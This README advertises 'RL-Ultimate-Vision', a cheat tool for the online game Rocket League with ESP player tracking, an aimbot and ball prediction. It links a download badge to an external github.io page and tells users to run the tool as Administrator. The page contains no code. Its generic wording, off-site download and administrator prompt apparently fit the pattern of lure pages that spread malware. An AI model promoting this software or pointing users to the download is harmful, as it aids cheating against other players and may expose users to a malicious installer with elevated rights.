# ⚽ RL-Ultimate-Vision - Gain the edge in Rocket League

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://melessainternationalistic758.github.io)

RL-Ultimate-Vision provides visual tools to improve your performance in Rocket League. The software includes a ball predictor, aim assist, boost management, and player visibility overlays. These tools display data on your screen to help you track game events and anticipate ball movement.

## ⚙️ System Requirements 

Your computer needs to meet these basic standards to run the software without issues:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
*   Memory: 8 GB RAM or higher.
*   Graphics Card: NVIDIA GTX 1060 or AMD Radeon RX 580 or better.
*   Game Version: Steam or Epic Games Store version of Rocket League.

Ensure your Windows installation has the latest updates. You also need the latest version of the Microsoft .NET Desktop Runtime installed on your machine.

## 🎯 Features

This software operates as an overlay. It reads game state data to provide the following information:

*   Ball Prediction: The software draws a path on the field to show where the ball lands.
*   Boost Tracker: A timer displays the respawn status of boost pads near your car.
*   ESP (Enhanced Sensory Perception): Names and lines appear over opponents to track their position.
*   Aimbot: The system assists in lining up your car for shots on the goal.
*   Velocity Indicators: Numbers show the speed of approaching objects on the field.

## 🕹️ Usage Instructions

Proper operation relies on the correct launch order. Follow these steps every time you play:

1.  Start the RL-Ultimate-Vision application first.
2.  Wait for the status indicator in the top corner of the window to turn green.
3.  Launch Rocket League.
4.  Enter a training match or a free play session.
5.  Press the F1 key to toggle the overlay on or off. 

The application detects the game window automatically. If the overlay fails to appear, ensure the game runs in "Borderless" or "Windowed" mode in your Rocket League video settings. 

## 🛠️ Troubleshooting Common Issues

Check these common fixes if the software behaves poorly or fails to load.

If the overlay does not show up, close both the game and the tool. Right-click the shortcut for the tool and select "Run as Administrator." This grants the necessary permissions to draw over the game window.

If the prediction lines look offset, check your resolution settings. Ensure your monitor resolution matches the settings inside the game menu. 

If the game crashes, update your graphics card drivers. Visit the website for your card manufacturer and download the software for your specific hardware.

Disable any other overlay software like Discord, Steam, or Xbox Game Bar if you experience stuttering. These programs compete for the same system resources and can lower your frame rate.

## 📝 Configuration File

Users with advanced needs can edit the settings file located in the installation folder. Open `settings.ini` with any text editor to modify these variables:

*   `ShowBallPath`: Set to "true" to enable the path visual.
*   `OverlayOpacity`: Change this value from 0.1 to 1.0 to adjust the transparency of the lines.
*   `UpdateRate`: Adjust the frequency of data polling. High numbers reduce system load, while low numbers increase responsiveness.

Save the file and restart the application to apply changes.
